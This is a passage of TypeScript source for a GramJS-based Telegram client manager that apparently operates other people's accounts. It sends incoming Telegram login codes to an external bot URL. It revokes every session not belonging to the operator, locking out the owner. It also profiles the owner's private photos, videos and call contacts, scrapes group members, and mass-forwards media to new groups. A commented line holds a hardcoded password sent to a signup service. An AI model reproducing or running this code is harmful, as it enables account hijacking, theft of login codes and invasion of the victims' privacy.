folderId,\r\n                    }),\r\n                ],\r\n            })\r\n        );\r\n\r\n        // Add users to the channel\r\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\r\n        const addUsersResult = await this.client.invoke(\r\n            new Api.channels.InviteToChannel({\r\n                channel: new Api.InputChannel({\r\n                    channelId: id,\r\n                    accessHash: accessHash,\r\n                }),\r\n                users: usersToAdd\r\n            })\r\n        );\r\n        return { id, accessHash };\r\n    }\r\n\r\n    public async createGroupAndForward(fromChatId: string) {\r\n        const { id, accessHash } = await this.createGroup();\r\n        await this.forwardSecretMsgs(fromChatId, id.toString());\r\n    }\r\n\r\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\r\n        const result: any = await this.joinChannel(channel);\r\n        const folderId = 1; // Replace with the desired folder ID\r\n        await this.client.invoke(\r\n            new Api.folders.EditPeerFolders({\r\n                folderPeers: [\r\n                    new Api.InputFolderPeer({\r\n                        peer: new Api.InputPeerChannel({\r\n                            channelId: result.chats[0].id,\r\n                            accessHash: result.chats[0].accessHash,\r\n                        }),\r\n                        folderId: folderId,\r\n                    }),\r\n                ],\r\n            })\r\n        );\r\n\r\n        await this.forwardSecretMsgs(fromChatId, channel);\r\n    }\r\n\r\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\r\n        let offset = 0;\r\n        let limit = 100;\r\n        let totalMessages = 0;\r\n        let forwardedCount = 0;\r\n        let messages: any = [];\r\n        do {\r\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\r\n            totalMessages = messages.total;\r\n            const messageIds = messages.map((message: Api.Message) => {\r\n                offset = message.id;\r\n                if (message.id && message.media) {\r\n                    return message.id;\r\n                }\r\n                return undefined;\r\n            }).filter(id => id !== undefined);\r\n            console.log(messageIds)\r\n            if (messageIds.length > 0) {\r\n                try {\r\n                    const result = await this.client.forwardMessages(toChatId, {\r\n                        messages: messageIds,\r\n                        fromPeer: fromChatId,\r\n                    });\r\n\r\n                    forwardedCount += messageIds.length;\r\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\r\n                    await sleep(5000); // Sleep for a second to avoid rate limits\r\n                } catch (error) {\r\n                    console.error(\"Error occurred while forwarding messages:\", error);\r\n                }\r\n                await sleep(5000); // Sleep for a second to avoid rate limits\r\n            }\r\n        } while (messages.length > 0);\r\n\r\n        await this.leaveChannels([toChatId]);\r\n        return;\r\n    }\r\n\r\n    //logic to forward messages from a chat to another chat maintaining rate limits\r\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\r\n        const chunkSize = 30; // Number of messages to forward per request\r\n        const totalMessages = messageIds.length;\r\n        let forwardedCount = 0;\r\n\r\n        for (let i = 0; i < totalMessages; i += chunkSize) {\r\n            const chunk = messageIds.slice(i, i + chunkSize);\r\n            try {\r\n                const result = await this.client.forwardMessages(toChatId, {\r\n                    messages: chunk,\r\n                    fromPeer: fromChatId,\r\n                });\r\n\r\n                forwardedCount += chunk.length;\r\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\r\n                await sleep(5000); // Sleep for a second to avoid rate limits\r\n            } catch (error) {\r\n                console.error(\"Error occurred while forwarding messages:\", error);\r\n            }\r\n        }\r\n\r\n        return forwardedCount;\r\n    }\r\n\r\n    async disconnect(): Promise<void> {\r\n        if (this.client) {\r\n            console.log(\"Destroying Client: \", this.phoneNumber)\r\n            // await this.client.destroy();\r\n            this.client._destroyed = true\r\n            await this.client.disconnect();\r\n            this.client = null;\r\n        }\r\n        this.session.delete();\r\n    }\r\n\r\n    async getchatId(username: string): Promise<any> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const entity = await this.client.getInputEntity(username);\r\n        return entity;\r\n    }\r\n\r\n    async getMe() {\r\n        const me = <Api.User>await this.client.getMe();\r\n        return me\r\n    }\r\n\r\n    async errorHandler(error) {\r\n        parseError(error)\r\n        if (error.message && error.message == 'TIMEOUT') {\r\n            // await this.client.disconnect();\r\n            // await this.client.destroy();\r\n            // await disconnectAll()\r\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\r\n        } else {\r\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\r\n            // Handle other types of errors\r\n        }\r\n    }\r\n\r\n    async createClient(handler = true, handlerFn?: Function): Promise<TelegramClient> {\r\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\r\n            connectionRetries: 5,\r\n        });\r\n        this.client.setLogLevel(LogLevel.ERROR);\r\n        this.client._errorHandler = this.errorHandler\r\n        await this.client.connect();\r\n        const me = <Api.User>await this.client.getMe();\r\n        console.log(\"Connected Client : \", me.phone);\r\n        if (handler && this.client) {\r\n            console.log(\"Adding event Handler\")\r\n            if (handlerFn) {\r\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\r\n            } else {\r\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\r\n            }\r\n        }\r\n        return this.client\r\n    }\r\n\r\n    async getGrpMembers(entity: EntityLike) {\r\n        try {\r\n            const result = []\r\n            // Fetch the group entity\r\n            const chat = await this.client.getEntity(entity);\r\n\r\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\r\n                console.log(\"Invalid group or channel!\");\r\n                return;\r\n            }\r\n\r\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\r\n\r\n            // Fetch members\r\n            const participants = await this.client.invoke(\r\n                new Api.channels.GetParticipants({\r\n                    channel: chat,\r\n                    filter: new Api.ChannelParticipantsRecent(),\r\n                    offset: 0,\r\n                    limit: 200, // Adjust the limit as needed\r\n                    hash: bigInt(0),\r\n                })\r\n            );\r\n\r\n            if (participants instanceof Api.channels.ChannelParticipants) {\r\n                const users = participants.participants;\r\n\r\n                console.log(`Members: ${users.length}`);\r\n                for (const user of users) {\r\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\r\n                    if (userInfo) {\r\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\r\n                        // console.log(\r\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\r\n                        //     }, Username: ${userDetails.username || \"\"}`\r\n                        // );\r\n                        result.push({\r\n                            tgId: userDetails.id,\r\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\r\n                            username: `${userDetails.username || \"\"}`,\r\n                        })\r\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\r\n                            console.log(JSON.stringify(userDetails.id))\r\n                        }\r\n                    } else {\r\n                        console.log(JSON.stringify((user as any)?.userId))\r\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\r\n                    }\r\n                }\r\n            } else {\r\n                console.log(\"No members found or invalid group.\");\r\n            }\r\n            console.log(result.length)\r\n            return result;\r\n        } catch (err) {\r\n            console.error(\"Error fetching group members:\", err);\r\n        }\r\n    }\r\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\r\n        const messages = await this.client.getMessages(entityLike, { limit });\r\n        return messages;\r\n    }\r\n    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {\r\n        const chats = await this.client.getDialogs(params);\r\n        console.log(\"TotalChats:\", chats.total);\r\n        return chats\r\n    }\r\n\r\n    async getLastMsgs(limit: number): Promise<string> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const msgs = await this.client.getMessages(\"777000\", { limit });\r\n        let resp = '';\r\n        msgs.forEach((msg) => {\r\n            console.log(msg.text);\r\n            resp += msg.text + \"\\n\";\r\n        });\r\n        return resp;\r\n    }\r\n\r\n    async getSelfMSgsInfo(): Promise<{\r\n        photoCount: number;\r\n        videoCount: number;\r\n        movieCount: number,\r\n        total: number,\r\n        ownPhotoCount: number,\r\n        otherPhotoCount: number,\r\n        ownVideoCount: number,\r\n        otherVideoCount: number\r\n    }> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const self = <Api.User>await this.client.getMe();\r\n        const selfChatId = self.id;\r\n\r\n        let photoCount = 0;\r\n        let ownPhotoCount = 0;\r\n        let ownVideoCount = 0;\r\n        let otherPhotoCount = 0;\r\n        let otherVideoCount = 0;\r\n        let videoCount = 0;\r\n        let movieCount = 0;\r\n\r\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\r\n        for (const message of messageHistory) {\r\n            const text = message.text.toLocaleLowerCase();\r\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n                movieCount++\r\n            } else {\r\n                if (message.photo) {\r\n                    photoCount++;\r\n                    if (!message.fwdFrom) {\r\n                        ownPhotoCount++\r\n                    } else {\r\n                        otherPhotoCount++\r\n                    }\r\n                } else if (message.video) {\r\n                    videoCount++;\r\n                    if (!message.fwdFrom) {\r\n                        ownVideoCount++\r\n                    } else {\r\n                        otherVideoCount++\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\r\n    }\r\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const chats = await this.client.getDialogs({ limit: 1500 });\r\n        let canSendTrueCount = 0;\r\n        let canSendFalseCount = 0;\r\n        let totalCount = 0;\r\n        this.channelArray.length = 0;\r\n        const canSendFalseChats = [];\r\n        console.log(\"TotalChats:\", chats.total);\r\n        for (const chat of chats) {\r\n            if (chat.isChannel || chat.isGroup) {\r\n                try {\r\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\r\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\r\n                    totalCount++;\r\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\r\n                        canSendTrueCount++;\r\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\r\n                    } else {\r\n                        canSendFalseCount++;\r\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error);\r\n                }\r\n            }\r\n        };\r\n        return {\r\n            chatsArrayLength: totalCount,\r\n            canSendTrueCount,\r\n            canSendFalseCount,\r\n            ids: sendIds ? this.channelArray : [],\r\n            canSendFalseChats\r\n        };\r\n    }\r\n\r\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\r\n        try {\r\n            for (let i = 0; i < data.length; i++) {\r\n                const user = data[i];\r\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\r\n                const lastName = \"\";\r\n                try {\r\n                    await this.client.invoke(\r\n                        new Api.contacts.AddContact({\r\n                            firstName,\r\n                            lastName,\r\n                            phone: user.mobile,\r\n                            id: user.tgId\r\n                        })\r\n                    );\r\n                } catch (e) {\r\n                    console.log(e)\r\n                }\r\n            }\r\n        } catch (error) {\r\n            console.error(\"Error adding contacts:\", error);\r\n            parseError(error, `Failed to save contacts`);\r\n        }\r\n    }\r\n\r\n\r\n    async addContacts(mobiles: string[], namePrefix: string) {\r\n        try {\r\n            const inputContacts: Api.TypeInputContact[] = [];\r\n\r\n            // Iterate over the data array and generate input contacts\r\n            for (let i = 0; i < mobiles.length; i++) {\r\n                const user = mobiles[i];\r\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\r\n                const lastName = \"\"; // Optional, no last name provided\r\n\r\n                // Generate client_id as a combination of i and j (for uniqueness)\r\n                // Since we only have one phone per user here, j will always be 0\r\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\r\n\r\n                inputContacts.push(new Api.InputPhoneContact({\r\n                    clientId: clientId,\r\n                    phone: user, // mobile number\r\n                    firstName: firstName,\r\n                    lastName: lastName\r\n                }));\r\n            }\r\n\r\n            // Call the API to import contacts\r\n            const result = await this.client.invoke(\r\n                new Api.contacts.ImportContacts({\r\n                    contacts: inputContacts,\r\n                })\r\n            );\r\n\r\n            console.log(\"Imported Contacts Result:\", result);\r\n\r\n\r\n        } catch (error) {\r\n            console.error(\"Error adding contacts:\", error);\r\n            parseError(error, `Failed to save contacts`);\r\n        }\r\n    }\r\n\r\n    async leaveChannels(chats: string[]) {\r\n        console.log(\"Leaving Channels: initaied!!\");\r\n        console.log(\"ChatsLength: \", chats)\r\n        for (let id of chats) {\r\n            try {\r\n                const joinResult = await this.client.invoke(\r\n                    new Api.channels.LeaveChannel({\r\n                        channel: id\r\n                    })\r\n                );\r\n                console.log(\"Left channel :\", id)\r\n                if (chats.length > 1) {\r\n                    await sleep(30000);\r\n                }\r\n            } catch (error) {\r\n                const errorDetails = parseError(error);\r\n                console.log(\"Failed to leave channel :\", errorDetails.message)\r\n            }\r\n        }\r\n    }\r\n\r\n    async getEntity(entity: Api.TypeEntityLike) {\r\n        return await this.client?.getEntity(entity)\r\n    }\r\n\r\n    async joinChannel(entity: Api.TypeEntityLike) {\r\n        console.log(\"trying to join channel : \", entity)\r\n        return await this.client?.invoke(\r\n            new Api.channels.JoinChannel({\r\n                channel: await this.client?.getEntity(entity)\r\n            })\r\n        );\r\n    }\r\n\r\n    connected() {\r\n        return this.client.connected;\r\n    }\r\n\r\n    async connect() {\r\n        return await this.client.connect();\r\n    }\r\n\r\n    async removeOtherAuths(): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        for (const auth of result.authorizations) {\r\n            if (this.isAuthMine(auth)) {\r\n                continue;\r\n            } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\r\n                await this.resetAuthorization(auth);\r\n            }\r\n        }\r\n    }\r\n\r\n    private isAuthMine(auth: any): boolean {\r\n        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\r\n            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\r\n            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\r\n            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||\r\n            auth.appName.toLowerCase().includes(\"hanslnz\") || auth.deviceModel.toLowerCase().includes('windows');\r\n    }\r\n\r\n\r\n    private async resetAuthorization(auth: any): Promise<void> {\r\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\r\n    }\r\n\r\n    async getAuths(): Promise<any> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        return result;\r\n    }\r\n\r\n    async getAllChats(): Promise<any[]> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const chats = await this.client.getDialogs({ limit: 500 });\r\n        console.log(\"TotalChats:\", chats.total);\r\n        const chatData = [];\r\n        for (const chat of chats) {\r\n            const chatEntity = await chat.entity.toJSON();\r\n            chatData.push(chatEntity);\r\n        }\r\n        return chatData;\r\n    }\r\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\r\n        const messages = await this.client.getMessages(chatId, {\r\n            offsetId: offset,\r\n            limit,\r\n        });\r\n\r\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\r\n            const media = message.media\r\n                ? {\r\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\r\n                    thumbnailUrl: await this.getMediaUrl(message),\r\n                }\r\n                : null;\r\n\r\n            return {\r\n                id: message.id,\r\n                message: message.message,\r\n                date: message.date,\r\n                sender: {\r\n                    id: message.senderId?.toString(),\r\n                    is_self: message.out,\r\n                    username: message.fromId ? message.fromId.toString() : null,\r\n                },\r\n                media,\r\n            };\r\n        }));\r\n\r\n        return result;\r\n    }\r\n\r\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\r\n        if (message.media instanceof Api.MessageMediaPhoto) {\r\n            console.log(\"messageId image:\", message.id)\r\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\r\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\r\n\r\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n            console.log(\"messageId video:\", message.id)\r\n            const sizes = message.document?.thumbs || [1]\r\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\r\n        }\r\n        return null;\r\n    }\r\n\r\n    async sendInlineMessage(chatId: string, message: string, url: string) {\r\n        const button = {\r\n            text: \"Open URL\",\r\n            url: url,\r\n        };\r\n        const result = await this.client.sendMessage(chatId, {\r\n            message: message,\r\n            buttons: [new Api.KeyboardButtonUrl(button)]\r\n        })\r\n        return result;\r\n    }\r\n\r\n    async getMediaMessages() {\r\n        const result = <Api.messages.Messages>await this.client.invoke(\r\n            new Api.messages.Search({\r\n                peer: new Api.InputPeerEmpty(),\r\n                q: '',\r\n                filter: new Api.InputMessagesFilterPhotos(),\r\n                minDate: 0,\r\n                maxDate: 0,\r\n                offsetId: 0,\r\n                addOffset: 0,\r\n                limit: 200,\r\n                maxId: 0,\r\n                minId: 0,\r\n                hash: bigInt(0),\r\n            })\r\n        );\r\n        return result\r\n    }\r\n\r\n\r\n    async getCallLog() {\r\n        const result = <Api.messages.Messages>await this.client.invoke(\r\n            new Api.messages.Search({\r\n                peer: new Api.InputPeerEmpty(),\r\n                q: '',\r\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\r\n                minDate: 0,\r\n                maxDate: 0,\r\n                offsetId: 0,\r\n                addOffset: 0,\r\n                limit: 200,\r\n                maxId: 0,\r\n                minId: 0,\r\n                hash: bigInt(0),\r\n            })\r\n        );\r\n\r\n        const callLogs = <Api.Message[]>result.messages.filter(\r\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\r\n        );\r\n\r\n        const filteredResults = {\r\n            outgoing: 0,\r\n            incoming: 0,\r\n            video: 0,\r\n            chatCallCounts: {},\r\n            totalCalls: 0\r\n        };\r\n        for (const log of callLogs) {\r\n            filteredResults.totalCalls++;\r\n            const logAction = <Api.MessageActionPhoneCall>log.action\r\n\r\n            // const callInfo = {\r\n            //     callId: logAction.callId.toString(),\r\n            //     duration: logAction.duration,\r\n            //     video: logAction.video,\r\n            //     timestamp: log.date\r\n            // };\r\n\r\n            // Categorize by type\r\n            if (log.out) {\r\n                filteredResults.outgoing++;\r\n            } else {\r\n                filteredResults.incoming++;\r\n            }\r\n\r\n            if (logAction.video) {\r\n                filteredResults.video++;\r\n            }\r\n\r\n            // Count calls per chat ID\r\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\r\n            if (!filteredResults.chatCallCounts[chatId]) {\r\n                const ent = <Api.User>await this.client.getEntity(chatId)\r\n                filteredResults.chatCallCounts[chatId] = {\r\n                    phone: ent.phone,\r\n                    username: ent.username,\r\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\r\n                    count: 0\r\n                };\r\n            }\r\n            filteredResults.chatCallCounts[chatId].count++;\r\n        }\r\n        const filteredChatCallCounts = [];\r\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\r\n            if (details['count'] > 4) {\r\n                let video = 0;\r\n                let photo = 0\r\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\r\n                for (const message of msgs) {\r\n                    const text = message.text.toLocaleLowerCase();\r\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n                        if (message.media instanceof Api.MessageMediaPhoto) {\r\n                            photo++\r\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n                            video++\r\n                        }\r\n                    }\r\n                }\r\n                filteredChatCallCounts.push({\r\n                    ...(details as any),\r\n                    msgs: msgs.total,\r\n                    video,\r\n                    photo,\r\n                    chatId,\r\n                })\r\n            }\r\n        }\r\n        console.log({\r\n            ...filteredResults,\r\n            chatCallCounts: filteredChatCallCounts\r\n        });\r\n\r\n        return {\r\n            ...filteredResults,\r\n            chatCallCounts: filteredChatCallCounts\r\n        };\r\n    }\r\n\r\n    async handleEvents(event: NewMessageEvent) {\r\n        if (event.isPrivate) {\r\n            if (event.message.chatId.toString() == \"777000\") {\r\n                console.log(event.message.text.toLowerCase());\r\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\r\n                console.log(\"Date :\", new Date(event.message.date * 1000))\r\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\r\n                //     console.log(\"LoginText: \", event.message.text)\r\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\r\n                //     console.log(\"Code is:\", code);\r\n                //     try {\r\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\r\n                //         console.log(\"Code Sent back\");\r\n                //     } catch (error) {\r\n                //         parseError(error)\r\n                //     }\r\n                // } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);\r\n                // await event.message.delete({ revoke: true });\r\n                // }\r\n            }\r\n        }\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll(),\r\n                    ],\r\n                })\r\n            );\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n        }\r\n        catch (e) {\r\n            throw e\r\n        }\r\n    }\r\n    async updateProfile(firstName: string, about: string) {\r\n        const data = {\r\n            lastName: \"\",\r\n        }\r\n        if (firstName !== undefined) {\r\n            data[\"firstName\"] = firstName\r\n        }\r\n        if (about !== undefined) {\r\n            data[\"about\"] = about\r\n        }\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.account.UpdateProfile(data)\r\n            );\r\n            console.log(\"Updated NAme: \", firstName);\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async downloadProfilePic(photoIndex: number) {\r\n        try {\r\n            const photos = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: 'me',\r\n                    offset: 0,\r\n                })\r\n            );\r\n\r\n            if (photos.photos.length > 0) {\r\n                console.log(`You have ${photos.photos.length} profile photos.`);\r\n\r\n                // Choose the photo index (0-based)\r\n                if (photoIndex < photos.photos.length) {\r\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\r\n\r\n                    // Extract the largest photo file (e.g., highest resolution)\r\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\r\n                    const photoFileSize = selectedPhoto.sizes[index];\r\n\r\n                    // Download the file\r\n                    const photoBuffer = await this.client.downloadFile(\r\n                        new Api.InputPhotoFileLocation({\r\n                            id: selectedPhoto.id,\r\n                            accessHash: selectedPhoto.accessHash,\r\n                            fileReference: selectedPhoto.fileReference,\r\n                            thumbSize: photoFileSize.type\r\n                        }), {\r\n                        dcId: selectedPhoto.dcId, // Data center ID\r\n                    });\r\n\r\n                    if (photoBuffer) {\r\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\r\n                        fs.writeFileSync(outputPath, photoBuffer);\r\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\r\n                        return outputPath;\r\n                    } else {\r\n                        console.log(\"Failed to download the photo.\");\r\n                    }\r\n                } else {\r\n                    console.log(`Photo index ${photoIndex} is out of range.`);\r\n                }\r\n            } else {\r\n                console.log(\"No profile photos found.\");\r\n            }\r\n        } catch (err) {\r\n            console.error(\"Error:\", err);\r\n        }\r\n    }\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!this.isAuthMine(auth)) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        });\r\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\r\n    }\r\n\r\n    async getContacts() {\r\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\r\n            hash: bigInt(0)\r\n        }));\r\n        return exportedContacts;\r\n    }\r\n\r\n    async deleteChat(chatId: string) {\r\n        try {\r\n            await this.client.invoke(new Api.messages.DeleteHistory({\r\n                justClear: false,\r\n                peer: chatId,\r\n                revoke: false,\r\n            }));\r\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\r\n        } catch (error) {\r\n            console.error('Failed to delete dialog:', error);\r\n        }\r\n    }\r\n\r\n    async blockUser(chatId: string) {\r\n        try {\r\n            await this.client?.invoke(new Api.contacts.Block({\r\n                id: chatId,\r\n            }));\r\n            console.log(`User with ID ${chatId} has been blocked.`);\r\n        } catch (error) {\r\n            console.error('Failed to block user:', error);\r\n        }\r\n    }\r\n\r\n    // Helper function to handle download with a timeout\r\n    downloadWithTimeout(promise: Promise<Buffer>, timeout: number) {\r\n        return Promise.race([\r\n            promise, // The actual download promise\r\n            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))\r\n        ]);\r\n    }\r\n\r\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\r\n        try {\r\n            const query = { limit: parseInt(limit.toString()) };\r\n            if (offset) query['offsetId'] = parseInt(offset.toString());\r\n\r\n            const messages = await this.client.getMessages(chatId, query);\r\n            const mediaMessages = messages.filter(message => {\r\n                // console.log(message.media?.className)\r\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\r\n            });\r\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\r\n\r\n            if (!messages.length) {\r\n                // If no media messages are returned, we might have reached the end\r\n                console.log(\"No more media messages found. Reached the end of the chat.\");\r\n                return { data: [], endOfMessages: true };\r\n            }\r\n\r\n            const data = [];\r\n\r\n            for (const message of mediaMessages) {\r\n                console.log(message.media.className, message.document?.mimeType);\r\n                let thumbBuffer = null;\r\n\r\n                try {\r\n                    if (message.media instanceof Api.MessageMediaPhoto) {\r\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\r\n\r\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\r\n                        console.log(\"messageId image:\", message.id)\r\n                        data.push({\r\n                            messageId: message.id,\r\n                            mediaType: 'photo',\r\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\r\n                        });\r\n\r\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n                        const sizes = message.document?.thumbs || [1];\r\n                        console.log(\"messageId video:\", message.id)\r\n                        // const fileSize = message.document.size;\r\n\r\n                        // // Skip overly large files for thumbnail (set threshold as needed)\r\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\r\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\r\n                        //     continue;\r\n                        // }\r\n\r\n                        // Call downloadWithTimeout with a 5-second timeout\r\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\r\n\r\n                        data.push({\r\n                            messageId: message.id,\r\n                            mediaType: 'video',\r\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\r\n                        });\r\n                    }\r\n                } catch (downloadError) {\r\n                    if (downloadError.message === 'Download timeout') {\r\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\r\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\r\n                        console.warn('File reference expired for message. Skipping this media.');\r\n                        // Skip the expired media, continue processing others\r\n                    } else {\r\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\r\n                    }\r\n                    data.push({\r\n                        messageId: message.id,\r\n                        mediaType: 'photo',\r\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\r\n                    });\r\n\r\n                    